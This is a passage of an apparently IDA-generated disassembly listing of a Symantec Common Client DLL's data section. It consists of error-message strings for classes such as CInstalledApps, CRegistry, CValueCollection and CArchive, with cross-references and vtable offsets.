aCinstalleda_12	db 'CInstalledApps::ConvertCStringToSz() : CString longer than dwSize'
					; DATA XREF: sub_6AF352E8:loc_6AF3530Bo
		db 0Ah,0
		align 8
; char aCinstalledap_5[]
aCinstalledap_5	db 'CInstalledApps::GetCCDataDirectory() : failed to retrieve CommonA'
					; DATA XREF: Ordinal188:loc_6AF3562Eo
		db 'ppData directory',0Ah,0
		align 10h
; char aCinstalledap_4[]
aCinstalledap_4	db 'CInstalledApps::GetCCDataDirectory() : backup resolution returned'
					; DATA XREF: Ordinal188+F9o
		db ' %s.',0Ah,0
		align 4
aCinstalledap_3	db 'CInstalledApps::GetCCDataDirectory() : reg.GetString() == FALSE',0Ah
					; DATA XREF: Ordinal188+B0o
		db 0
		align 4
; char aCinstalledap_2[]
aCinstalledap_2	db 'CInstalledApps::GetCCDataDirectory() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal188+83o
; char aCinstalledap_1[]
aCinstalledap_1	db 'CInstalledApps::GetCCDataDirectory() : Failed to lookup Installed'
					; DATA XREF: Ordinal188+20o
		db 'Apps.',0Ah,0
; char aCinstalledap_8[]
aCinstalledap_8	db 'CInstalledApps::GetSymSharedDirectory() : failed to retrieve Comm'
					; DATA XREF: sub_6AF35645:loc_6AF35719o
		db 'on Files directory',0Ah,0
		align 4
aCinstalledap_7	db 'CInstalledApps::GetSymSharedDirectory() : reg.GetString() == FALS'
					; DATA XREF: sub_6AF35645+89o
		db 'E',0Ah,0
; char aCinstalledap_6[]
aCinstalledap_6	db 'CInstalledApps::GetSymSharedDirectory() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: sub_6AF35645+5Fo
		align 10h
; char aCinstalleda_11[]
aCinstalleda_11	db 'CInstalledApps::GetCCDirectory() : backup resolution returned %s.'
					; DATA XREF: Ordinal186+3Fo
					; Ordinal185+50o
		db 0Ah,0
		align 8
; char aCinstalleda_10[]
aCinstalleda_10	db 'CInstalledApps::GetCCDirectory() : unable to retrieve Symantec Sh'
					; DATA XREF: Ordinal186+31o
					; Ordinal185+40o
		db 'ared directory',0Ah,0
		align 10h
; char aCinstalledap_9[]
aCinstalledap_9	db 'CInstalledApps::GetCCDirectory() : Failed to lookup InstalledApps'
					; DATA XREF: Ordinal186+19o
					; Ordinal185+21o
		db '.',0Ah,0
		align 8
; char aCinstalleda_13[]
aCinstalleda_13	db 'CInstalledApps::GetCCDataDirectory() : Failed to resolve Common C'
					; DATA XREF: Ordinal187:loc_6AF357B3o
		db 'lient Data directory.',0Ah,0
; char aCinstalleda_16[]
aCinstalleda_16	db 'CInstalledApps::GetCCDecDirectory() : unable to retrieve Symantec'
					; DATA XREF: Ordinal190:loc_6AF35841o
		db ' Shared directory',0Ah,0
		align 8
; char aCinstalleda_15[]
aCinstalleda_15	db 'CInstalledApps::GetCCDecDirectory() : backup resolution returned '
					; DATA XREF: Ordinal190+67o
		db '%s.',0Ah,0
		align 10h
; char aCinstalleda_14[]
aCinstalleda_14	db 'CInstalledApps::GetCCDecDirectory() : Failed to lookup InstalledA'
					; DATA XREF: Ordinal190+1Do
		db 'pps.',0Ah,0
		align 4
; char aCinstalleda_17[]
aCinstalleda_17	db 'CInstalledApps::GetSymSharedDirectory() : szDirectory too small ='
					; DATA XREF: sub_6AF3585C+35o
		db '= FALSE',0Ah,0
		align 8
; char aCinstalleda_18[]
aCinstalleda_18	db 'CInstalledApps::GetCCDecDirectory() : Failed to resolve CC Decomp'
					; DATA XREF: Ordinal189:loc_6AF35940o
		db 'osers directory.',0Ah,0
		align 10h
; char aCkeyvaluecolle[]
aCkeyvaluecolle	db 'CKeyValueCollection::GetKeyAt() : dwIndex >= m_ValueMap.size()',0Ah,0
					; DATA XREF: Ordinal213+2Co
; char aCkeyvaluecol_2[]
aCkeyvaluecol_2	db 'CKeyValueCollection::SaveArchive() : SaveValue() == FALSE',0Ah,0
					; DATA XREF: Ordinal218:loc_6AF35CC1o
		align 4
; char aCkeyvaluecol_1[]
aCkeyvaluecol_1	db 'CKeyValueCollection::SaveArchive() : Archive.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal218:loc_6AF35C6Ao
					; Ordinal218:loc_6AF35CBAo
		align 10h
aCkeyvaluecol_0	db 'CKeyValueCollection::SaveArchive() : CValueCollection::SaveArchiv'
					; DATA XREF: Ordinal218+15o
		db 'e() == false',0Ah,0
		align 10h
; char aCkeyvaluecol_3[]
aCkeyvaluecol_3	db 'CKeyValueCollection::GetReadValue() : pos == m_ValueMap.end()',0Ah,0
					; DATA XREF: Ordinal215+25o
		align 10h
; char aCkeyvaluecol_4[]
aCkeyvaluecol_4	db 'CKeyValueCollection::Remove() : pos == m_ValueMap.end()',0Ah,0
					; DATA XREF: Ordinal210+36o
		align 10h
; char aCkeyvalueco_10[]
aCkeyvalueco_10	db 'CKeyValueCollection::Copy() : pValueCollection->GetType() == fals'
					; DATA XREF: Ordinal212:loc_6AF36694o
		db 'e',0Ah,0
aCkeyvaluecol_9	db 'CKeyValueCollection::Copy() : CopyValue() == false',0Ah,0
					; DATA XREF: Ordinal212:loc_6AF3668Do
aCkeyvaluecol_8	db 'CKeyValueCollection::Copy() : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal212:loc_6AF36686o
aCkeyvaluecol_7	db 'CKeyValueCollection::Copy() : pKeyValueCollection->GetKeyAt() == '
					; DATA XREF: Ordinal212:loc_6AF3667Fo
		db 'false',0Ah,0
aCkeyvaluecol_6	db 'CKeyValueCollection::Copy() : pValueCollection->GetCount() == fal'
					; DATA XREF: Ordinal212+56o
		db 'se',0Ah,0
		align 10h
; char aCkeyvaluecol_5[]
aCkeyvaluecol_5	db 'CKeyValueCollection::Copy() : pKeyValueCollection == NULL',0Ah,0
					; DATA XREF: Ordinal212+34o
		align 4
; char aCkeyvalueco_15[]
aCkeyvalueco_15	db 'CKeyValueCollection::LoadArchive() : LoadValue() == false',0Ah,0
					; DATA XREF: Ordinal217:loc_6AF36775o
		align 4
aCkeyvalueco_14	db 'CKeyValueCollection::LoadArchive() : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal217:loc_6AF3676Eo
		align 4
aCkeyvalueco_13	db 'CKeyValueCollection::LoadArchive() : switch(default)',0Ah,0
					; DATA XREF: Ordinal217+61o
		align 10h
; char aCkeyvalueco_12[]
aCkeyvalueco_12	db 'CKeyValueCollection::LoadArchive() : Archive.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal217+46o
					; Ordinal217:loc_6AF36767o
		align 10h
; char aCkeyvalueco_11[]
aCkeyvalueco_11	db 'CKeyValueCollection::LoadArchive() : CValueCollection::LoadArchiv'
					; DATA XREF: Ordinal217+1Fo
		db 'e() == false',0Ah,0
		align 10h
off_6AF560F0	dd offset sub_6AF369C0	; DATA XREF: Ordinal206+3o
					; Ordinal205+Bo ...
		dd offset _purecall
		dd offset Ordinal215
		dd offset Ordinal216
		dd offset Ordinal217
		dd offset Ordinal218
aCkeyvalueco_16	db 'CKeyValueCollection::GetWriteValue()',0 ; DATA XREF: Ordinal216+20o
		align 10h
aCkeyvalueco_17	db 'CKeyValueCollection::operator =()',0 ; DATA XREF: Ordinal208+31o
		align 4
off_6AF56154	dd offset sub_6AF36F68	; DATA XREF: Ordinal229+4o
					; Ordinal230+3o
; char aCregistryIni_1[]
aCregistryIni_1	db 'CRegistry::Initialize() : GetSystemDirectory() == 0',0Ah,0
					; DATA XREF: Ordinal244:loc_6AF36EAEo
		align 10h
; char aCregistryIni_0[]
aCregistryIni_0	db 'CRegistry::Initialize() : GetProcAddress() == NULL',0Ah,0
					; DATA XREF: Ordinal244:loc_6AF36E7Ao
aCregistryIniti	db 'CRegistry::Initialize() : LoadLibrary() == NULL',0Ah,0
					; DATA XREF: Ordinal244+6Eo
		align 4
; char String2[]
String2		db '\SymStore.dll',0    ; DATA XREF: Ordinal244+48o
		align 4
; char aCregistryOpe_0[]
aCregistryOpe_0	db 'CRegistry::Open() : m_pfnSymRegCreateKeyExA() != ERROR_SUCCESS',0Ah,0
					; DATA XREF: Ordinal232+61o
aCregistryOpenM	db 'CRegistry::Open() : m_pfnSymRegOpenKeyExA() != ERROR_SUCCESS',0Ah,0
					; DATA XREF: Ordinal232+41o
		align 4
; char aCvaluecollecti[]
aCvaluecollecti	db 'CValueCollection::GetType() : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal261+36o
		align 10h
; char aCvaluecollec_0[]
aCvaluecollec_0	db 'CValueCollection::SetValue(bool) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal265+30o
		align 10h
; char aCvaluecollec_1[]
aCvaluecollec_1	db 'CValueCollection::SetValue(BYTE) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal267+30o
		align 10h
; char aCvaluecollec_2[]
aCvaluecollec_2	db 'CValueCollection::SetValue(WORD) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal269+30o
		align 10h
; char aCvaluecollec_3[]
aCvaluecollec_3	db 'CValueCollection::SetValue(DWORD) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal271+30o
		align 10h
; char aCvaluecollec_4[]
aCvaluecollec_4	db 'CValueCollection::SetValue(ULONGLONG) : GetWriteValue() == false',0Ah
					; DATA XREF: Ordinal273+30o
		db 0
		align 4
; char aCvaluecollec_5[]
aCvaluecollec_5	db 'CValueCollection::SetValue(double) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal275+30o
		align 4
; char aCvaluecollec_6[]
aCvaluecollec_6	db 'CValueCollection::SetValue(long) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal277+30o
		align 8
aCvaluecollec_9	db 'CValueCollection::SetValue(LPVOID) : pValue->m_Raw.NewAlloc() == '
					; DATA XREF: Ordinal280+72o
		db 'NULL',0Ah,0
		align 10h
; char aCvaluecollec_8[]
aCvaluecollec_8	db 'CValueCollection::SetValue(LPVOID) : pData == NULL && dwSize > 0',0Ah
					; DATA XREF: Ordinal280:loc_6AF37359o
		db 0
		align 4
; char aCvaluecollec_7[]
aCvaluecollec_7	db 'CValueCollection::SetValue(LPVOID) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal280+3Ao
		align 8
; char aCvaluecolle_11[]
aCvaluecolle_11	db 'CValueCollection::SetValue(VARIANT) : VariantCopyInd() != S_OK, 0'
					; DATA XREF: Ordinal288+52o
		db 'x%08X',0Ah,0
; char aCvaluecolle_10[]
aCvaluecolle_10	db 'CValueCollection::SetValue(VARIANT) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal288+30o
; char aCvaluecolle_12[]
aCvaluecolle_12	db 'CValueCollection::Save() : SaveArchive() == false',0Ah,0
					; DATA XREF: Ordinal291+48o
		align 4
; char aCvaluecolle_13[]
aCvaluecolle_13	db 'CValueCollection::Load() : LoadArchive() == false',0Ah,0
					; DATA XREF: Ordinal292+4Ao
		align 4
; char aCvaluecolle_14[]
aCvaluecolle_14	db 'CValueCollection::GetSize() : SaveArchive() == false',0Ah,0
					; DATA XREF: Ordinal293+3Ao
		align 10h
aCvaluecolle_16	db 'CValueCollection::LoadArchive() : switch(default)',0Ah,0
					; DATA XREF: Ordinal296+33o
		align 4
; char aCvaluecolle_15[]
aCvaluecolle_15	db 'CValueCollection::LoadArchive() : Archive.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal296+1Bo
					; Ordinal296+4Ao
		align 10h
; char aCvaluecolle_17[]
aCvaluecolle_17	db 'CValueCollection::SaveArchive() : Archive.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal297:loc_6AF37674o
; char aCvaluecolle_18[]
aCvaluecolle_18	db 'CValueCollection::GetSize() : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal260+36o
		align 8
; char aCvaluecolle_19[]
aCvaluecolle_19	db 'CValueCollection::SetValue(ISymBase) : GetWriteValue() == false',0Ah
					; DATA XREF: Ordinal290+30o
		db 0
		align 4
aCvaluecolle_27	db 'CValueCollection::LoadValue() : bArchive == FALSE',0Ah,0
					; DATA XREF: Ordinal299:loc_6AF37B60o
		align 10h
; char aCvaluecolle_26[]
aCvaluecolle_26	db 'CValueCollection::LoadValue() : switch(default)',0Ah,0
					; DATA XREF: Ordinal299:loc_6AF37B4Fo
		align 4
; char aCvaluecolle_25[]
aCvaluecolle_25	db 'CValueCollection::LoadValue() : CreateObject() == false',0Ah,0
					; DATA XREF: Ordinal299:loc_6AF37B42o
		align 10h
; char aCvaluecolle_24[]
aCvaluecolle_24	db 'CValueCollection::LoadValue() : pSerialize->Load() == false',0Ah,0
					; DATA XREF: Ordinal299+1F7o
		align 10h
aCvaluecolle_23	db 'CValueCollection::LoadValue() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal299+1A5o
aCvaluecolle_22	db 'CValueCollection::LoadValue() : Archive.PeekSize() == FALSE',0Ah,0
					; DATA XREF: Ordinal299+187o
		align 4
; char aCvaluecolle_21[]
aCvaluecolle_21	db 'CValueCollection::LoadValue() : pSerialize == NULL',0Ah,0
					; DATA XREF: Ordinal299+165o
; char aCvaluecolle_20[]
aCvaluecolle_20	db 'CValueCollection::LoadValue() : Archive.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal299+129o
					; Ordinal299+1CAo ...
		align 4
aCvaluecolle_35	db 'CValueCollection::SaveValue() : bArchive == FALSE',0Ah,0
					; DATA XREF: Ordinal300:loc_6AF37DE8o
		align 4
; char aCvaluecolle_34[]
aCvaluecolle_34	db 'CValueCollection::SaveValue() : switch(default)',0Ah,0
					; DATA XREF: Ordinal300:loc_6AF37DD7o
		align 10h
aCvaluecolle_33	db 'CValueCollection::SaveValue() : pSerialize->Save() == false',0Ah,0
					; DATA XREF: Ordinal300+1D2o
		align 10h
aCvaluecolle_32	db 'CValueCollection::SaveValue() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal300+19Fo
aCvaluecolle_31	db 'CValueCollection::SaveValue() : pSerialize->GetSize() == false',0Ah,0
					; DATA XREF: Ordinal300+181o
; char aCvaluecolle_30[]
aCvaluecolle_30	db 'CValueCollection::SaveValue() : Archive.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal300+166o
					; Ordinal300+1F0o ...
		align 8
aCvaluecolle_29	db 'CValueCollection::SaveValue() : pSerialize->GetObjectId() == fals'
					; DATA XREF: Ordinal300+14Eo
		db 'e',0Ah,0
; char aCvaluecolle_28[]
aCvaluecolle_28	db 'CValueCollection::SaveValue() : pSerialize == NULL',0Ah,0
					; DATA XREF: Ordinal300+131o
off_6AF56B50	dd offset sub_6AF37F1D	; DATA XREF: Ordinal245+Ao
					; Ordinal246+3o ...
off_6AF56B54	dd offset sub_6AF37F39	; DATA XREF: Ordinal256+6o
					; Ordinal257+6o ...
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
		dd offset Ordinal296
		dd offset Ordinal297
; char aCvaluecolle_37[]
aCvaluecolle_37	db 'CValueCollection::CopyValue() : switch(default)',0Ah,0
					; DATA XREF: Ordinal301:loc_6AF3816Do
		align 10h
aCvaluecolle_36	db 'CValueCollection::CopyValue()',0 ; DATA XREF: Ordinal301+1Bo
		align 10h
aCvalueConvert	db 'CValue::Convert()',0 ; DATA XREF: Ordinal255+1Ao
		align 4
; char aCvalueOperat_0[]
aCvalueOperat_0	db 'CValue::operator =() : VariantCopyInd() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal248+181o
		align 10h
aCvalueOperator	db 'CValue::operator =()',0 ; DATA XREF: Ordinal248+30o
		align 4
; char aCvaluecolle_42[]
aCvaluecolle_42	db 'CValueCollection::GetReadValue() : m_AutoConvertValue.Convert() ='
					; DATA XREF: Ordinal298+7Fo
		db '= false',0Ah,0
		align 8
aCvaluecolle_41	db 'CValueCollection::GetReadValue() : m_AutoConvertValue.IsEmpty() !'
					; DATA XREF: Ordinal298+69o
		db '= false',0Ah,0
		align 8
; char aCvaluecolle_40[]
aCvaluecolle_40	db 'CValueCollection::GetReadValue() : pValue->CanConvert() == false',0Ah
					; DATA XREF: Ordinal298+49o
		db 0
		align 4
aCvaluecolle_39	db 'CValueCollection::GetReadValue() : m_bAutoConvert == false',0Ah,0
					; DATA XREF: Ordinal298+38o
; char aCvaluecolle_38[]
aCvaluecolle_38	db 'CValueCollection::GetReadValue() : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal298+1Bo
; char aCvaluecolle_43[]
aCvaluecolle_43	db 'CValueCollection::GetValue(bool) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal264+38o
; char aCvaluecolle_44[]
aCvaluecolle_44	db 'CValueCollection::GetValue(BYTE) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal266+38o
; char aCvaluecolle_45[]
aCvaluecolle_45	db 'CValueCollection::GetValue(WORD) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal268+39o
; char aCvaluecolle_46[]
aCvaluecolle_46	db 'CValueCollection::GetValue(DWORD) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal270+38o
		align 4
; char aCvaluecolle_47[]
aCvaluecolle_47	db 'CValueCollection::GetValue(ULONGLONG) : GetReadValue() == false',0Ah
					; DATA XREF: Ordinal272+3Bo
		db 0
		align 4
; char aCvaluecolle_48[]
aCvaluecolle_48	db 'CValueCollection::GetValue(double) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal274+3Ao
		align 4
; char aCvaluecolle_49[]
aCvaluecolle_49	db 'CValueCollection::GetValue(long) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal276+38o
; char aCvaluecolle_52[]
aCvaluecolle_52	db 'CValueCollection::GetValue(LPVOID) : pData == NULL',0Ah,0
					; DATA XREF: Ordinal279:loc_6AF38BADo
; char aCvaluecolle_51[]
aCvaluecolle_51	db 'CValueCollection::GetValue(LPVOID) : dwSize < dwDataSize',0Ah,0
					; DATA XREF: Ordinal279+76o
		align 4
; char aCvaluecolle_50[]
aCvaluecolle_50	db 'CValueCollection::GetValue(LPVOID) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal279+4Ao
		align 4
; char aCvaluecolle_55[]
aCvaluecolle_55	db 'CValueCollection::GetValue(LPSTR) : szString == NULL',0Ah,0
					; DATA XREF: Ordinal282:loc_6AF38C55o
		align 10h
; char aCvaluecolle_54[]
aCvaluecolle_54	db 'CValueCollection::GetValue(LPSTR) : dwSize < dwDataSize',0Ah,0
					; DATA XREF: Ordinal282+6Bo
		align 4
; char aCvaluecolle_53[]
aCvaluecolle_53	db 'CValueCollection::GetValue(LPSTR) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal282+49o
		align 4
aCvaluecolle_57	db 'CValueCollection::SetValue(LPCSTR)',0
					; DATA XREF: Ordinal283:loc_6AF38CBFo
		align 10h
; char aCvaluecolle_56[]
aCvaluecolle_56	db 'CValueCollection::SetValue(LPCSTR) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal283+46o
		align 10h
; char aCvaluecolle_60[]
aCvaluecolle_60	db 'CValueCollection::GetValue(LPWSTR) : szString == NULL',0Ah,0
					; DATA XREF: Ordinal285:loc_6AF38E5Bo
		align 4
; char aCvaluecolle_59[]
aCvaluecolle_59	db 'CValueCollection::GetValue(LPWSTR) : dwSize < dwDataSize',0Ah,0
					; DATA XREF: Ordinal285+6Eo
		align 4
; char aCvaluecolle_58[]
aCvaluecolle_58	db 'CValueCollection::GetValue(LPWSTR) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal285+49o
		align 4
aCvaluecolle_62	db 'CValueCollection::SetValue(LPCWSTR)',0
					; DATA XREF: Ordinal286:loc_6AF38EC5o
; char aCvaluecolle_61[]
aCvaluecolle_61	db 'CValueCollection::SetValue(LPCWSTR) : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal286+46o
; char aCvaluecolle_64[]
aCvaluecolle_64	db 'CValueCollection::GetValue(VARIANT) : VariantCopyInd() != S_OK, 0'
					; DATA XREF: Ordinal287+5Do
		db 'x%08X',0Ah,0
; char aCvaluecolle_63[]
aCvaluecolle_63	db 'CValueCollection::GetValue(VARIANT) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal287+3Bo
		align 10h
; char aCvaluecolle_65[]
aCvaluecolle_65	db 'CValueCollection::GetValue(ISymBase) : GetReadValue() == false',0Ah,0
					; DATA XREF: Ordinal289+43o
off_6AF572E0	dd offset sub_6AF3939A	; DATA XREF: Ordinal302+Fo
					; Ordinal303+3o
; char aCadmindaclCr_4[]
aCadmindaclCr_4	db 'CAdminDacl::Create() : AddAccessAllowedAce() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal306+19Eo
		align 8
aCadmindaclCr_3	db 'CAdminDacl::Create() : SetSecurityDescriptorDacl() == FALSE, 0x%0'
					; DATA XREF: Ordinal306+185o
		db '8X',0Ah,0
		align 10h
; char aCadmindaclCr_2[]
aCadmindaclCr_2	db 'CAdminDacl::Create() : InitializeAcl() == FALSE',0Ah,0
					; DATA XREF: Ordinal306+123o
		align 4
aCadmindaclCr_1	db 'CAdminDacl::Create() : m_AclMem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal306+10Eo
aCadmindaclCr_0	db 'CAdminDacl::Create() : InitializeSecurityDescriptor() == FALSE, 0'
					; DATA XREF: Ordinal306+F4o
		db 'x%08X',0Ah,0
aCadmindaclCrea	db 'CAdminDacl::Create() : AllocateAndInitializeSid() == FALSE, 0x%08'
					; DATA XREF: Ordinal306+C6o
		db 'X',0Ah,0
off_6AF57464	dd offset unknown_libname_3 ; DATA XREF: Ordinal308+2o
					; Ordinal309+2o ...
					; Microsoft VisualC 2-10/net runtime
off_6AF57468	dd offset unknown_libname_4 ; DATA XREF: Ordinal311+Eo
					; Ordinal312o ...
					; Microsoft VisualC 2-10/net runtime
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
; char aCarchiveResetS[]
aCarchiveResetS	db 'CArchive::Reset() : SetPosEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal316+13o
		align 8
; char aCarchiveWrit_1[]
aCarchiveWrit_1	db 'CArchive::WriteVariantBuffer() : varBuffer.Reference() == FALSE',0Ah
					; DATA XREF: Ordinal376:loc_6AF39510o
		db 0
		align 10h
aCarchiveWrit_0	db 'CArchive::WriteVariantBuffer() : varBuffer.GetBuffer() == NULL',0Ah,0
					; DATA XREF: Ordinal376+65o
; char aCarchiveWritev[]
aCarchiveWritev	db 'CArchive::WriteVariantBuffer() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal376+4Co
					; Ordinal376+7Bo
		align 4
; char aCarchiveRead_2[]
aCarchiveRead_2	db 'CArchive::ReadVariantBuffer() : varBuffer.Detach() == FALSE',0Ah,0
					; DATA XREF: Ordinal377+ACo
		align 4
; char aCarchiveRead_1[]
aCarchiveRead_1	db 'CArchive::ReadVariantBuffer() : varBuffer.GetBuffer() == NULL',0Ah,0
					; DATA XREF: Ordinal377+61o
		align 4
aCarchiveRead_0	db 'CArchive::ReadVariantBuffer() : varBuffer.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal377+4Eo
		align 4
; char aCarchiveReadva[]
aCarchiveReadva	db 'CArchive::ReadVariantBuffer() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal377+28o
					; Ordinal377+7Co
		align 4
; char aCarchiveWrit_2[]
aCarchiveWrit_2	db 'CArchive::WriteVariantString() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal378+2Co
					; Ordinal378+51o
		align 8
; char aCarchiveRead_4[]
aCarchiveRead_4	db 'CArchive::ReadVariantString() : SysAllocStringByteLen() == NULL',0Ah
					; DATA XREF: Ordinal379+46o
		db 0
		align 4
; char aCarchiveRead_3[]
aCarchiveRead_3	db 'CArchive::ReadVariantString() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal379+1Eo
					; Ordinal379+62o
		align 10h
dword_6AF57710	dd 109h, 0		; DATA XREF: sub_6AF39E20+14o
		dd 0C0h, 46000000h
; char aCarchivePeekSe[]
aCarchivePeekSe	db 'CArchive::Peek() : SetPosEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal313+98o
; char aCarchivePeakRe[]
aCarchivePeakRe	db 'CArchive::Peak() : ReadEx() == FALSE',0Ah,0 ; DATA XREF: Ordinal313+7Co
		align 10h
aCarchivePeekRe	db 'CArchive::Peek() : ReadEx() == FALSE',0Ah,0 ; DATA XREF: Ordinal313+48o
		align 4
; char aCarchivePeekM_[]
aCarchivePeekM_	db 'CArchive::Peek() : m_eArchiveType != eReadArchive',0Ah,0
					; DATA XREF: Ordinal313+22o
		align 4
; char aCarchiveReadRe[]
aCarchiveReadRe	db 'CArchive::Read() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal367:loc_6AF398FFo
		align 4
aCarchiveReadDw	db 'CArchive::Read() : dwSize < dwRead',0Ah,0 ; DATA XREF: Ordinal367+7Fo
aCarchiveReadEr	db 'CArchive::Read() : eReadType != eType',0Ah,0 ; DATA XREF: Ordinal367+4Ao
		align 10h
; char aCarchiveReadM_[]
aCarchiveReadM_	db 'CArchive::Read() : m_eArchiveType != eReadArchive',0Ah,0
					; DATA XREF: Ordinal367+17o
		align 4
; char aCarchiveWriteW[]
aCarchiveWriteW	db 'CArchive::Write() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal368:loc_6AF399A2o
; char aCarchiveWriteM[]
aCarchiveWriteM	db 'CArchive::Write() : m_eArchiveType != eWriteArchive',0Ah,0
					; DATA XREF: Ordinal368+Do
		align 8
; char aCarchiveRead_9[]
aCarchiveRead_9	db 'CArchive::ReadVariantObject() : OleLoadFromStream() != S_OK, 0x%0'
					; DATA XREF: Ordinal381+117o
		db '8X',0Ah,0
		align 10h
; char aCarchiveRead_8[]
aCarchiveRead_8	db 'CArchive::ReadVariantObject() : CreateStreamOnHGlobal() != S_OK, '
					; DATA XREF: Ordinal381+C5o
		db '0x%08X',0Ah,0
		align 4
; char aCarchiveRead_7[]
aCarchiveRead_7	db 'CArchive::ReadVariantObject() : GlobalLock() == NULL',0Ah,0
					; DATA XREF: Ordinal381+5Do
		align 4
aCarchiveRead_6	db 'CArchive::ReadVariantObject() : GlobalAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal381+4Bo
		align 4
; char aCarchiveRead_5[]
aCarchiveRead_5	db 'CArchive::ReadVariantObject() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal381+24o
					; Ordinal381+7Co
		align 10h
aCarchiveRea_14	db 'CArchive::ReadVariant() : ReadVariantObject() == FALSE',0Ah,0
					; DATA XREF: Ordinal373+DEo
aCarchiveRea_13	db 'CArchive::ReadVariant() : ReadVariantString() == FALSE',0Ah,0
					; DATA XREF: Ordinal373+A3o
aCarchiveRea_12	db 'CArchive::ReadVariant() : ReadVariantArray() == FALSE',0Ah,0
					; DATA XREF: Ordinal373+79o
		align 4
; char aCarchiveRea_11[]
aCarchiveRea_11	db 'CArchive::ReadVariant() : ReadVariantBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal373+59o
; char aCarchiveRea_10[]
aCarchiveRea_10	db 'CArchive::ReadVariant() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal373+23o
					; Ordinal373+B6o
		align 10h
; char aCarchiveRea_19[]
aCarchiveRea_19	db 'CArchive::ReadVariantArray() : varArray.Detach() == FALSE',0Ah,0
					; DATA XREF: Ordinal375+C7o
		align 4
; char aCarchiveRea_18[]
aCarchiveRea_18	db 'CArchive::ReadVariantArray() : ReadVariant() == FALSE',0Ah,0
					; DATA XREF: Ordinal375:loc_6AF3A1D4o
		align 4
; char aCarchiveRea_17[]
aCarchiveRea_17	db 'CArchive::ReadVariantArray() : varArray.Lock() == FALSE',0Ah,0
					; DATA XREF: Ordinal375+64o
		align 10h
aCarchiveRea_16	db 'CArchive::ReadVariantArray() : varArray.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal375+51o
		align 4
; char aCarchiveRea_15[]
aCarchiveRea_15	db 'CArchive::ReadVariantArray() : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal375+2Bo
		align 10h
; char aCarchiveRea_23[]
aCarchiveRea_23	db 'CArchive::Read(LPVARIANT) : ReadVariant() == FALSE',0Ah,0
					; DATA XREF: Ordinal342+7Fo
aCarchiveRea_22	db 'CArchive::Read(LPCVARIANT) : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal342+62o
aCarchiveRea_21	db 'CArchive::Read(LPVARIANT) : eReadType != eVariantData',0Ah,0
					; DATA XREF: Ordinal342+46o
		align 4
aCarchiveRea_20	db 'CArchive::Read(LPVARIANT) : ReadEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal342+39o
		align 4
; char aCarchiveReadLp[]
aCarchiveReadLp	db 'CArchive::Read(LPVARIANT) : m_eArchiveType != eReadArchive',0Ah,0
					; DATA XREF: Ordinal342+Fo
; char aCarchiveWrit_8[]
aCarchiveWrit_8	db 'CArchive::WriteVariantObject() : CreateStreamOnHGlobal() != S_OK,'
					; DATA XREF: Ordinal380+16Do
		db ' 0x%08X',0Ah,0
		align 8
; char aCarchiveWrit_7[]
aCarchiveWrit_7	db 'CArchive::WriteVariantObject() : GetHGlobalFromStream() != S_OK',0Ah
					; DATA XREF: Ordinal380:loc_6AF3A59Co
		db 0
		align 4
; char aCarchiveWrit_6[]
aCarchiveWrit_6	db 'CArchive::WriteVariantObject() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal380:loc_6AF3A564o
		align 4
; char aCarchiveWrit_5[]
